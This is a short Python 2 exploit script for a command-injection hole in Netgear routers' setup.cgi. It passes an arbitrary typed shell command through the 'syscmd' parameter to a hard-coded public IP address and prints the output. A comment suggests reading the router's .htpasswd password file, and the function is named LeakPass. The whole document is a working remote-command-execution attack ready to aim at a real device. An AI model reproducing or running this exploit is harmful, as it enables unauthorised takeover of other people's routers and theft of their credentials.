import requests
#cat%20/www/.htpasswd
def LeakPass(ip, port,a):
	header = {"User-Agent":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;"}
	uri = "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=" + a + "&curpath=/&currentsetting.htm"
	url = "http://" + ip + ":" + str(port) + uri
	try:
		res = requests.get(url, headers=header, verify=False, timeout=8)
		data = res.content
	except Exception as e:
		pass
	if data > -1:
		print data
	else:
		return None

if __name__ == "__main__":
	print "--------------------\nINPUT YOUR COMMAND:|\n--------------------"
	a = raw_input()
	ip = "151.25.222.238"
	port = 80
	LeakPass(ip,port,a)





























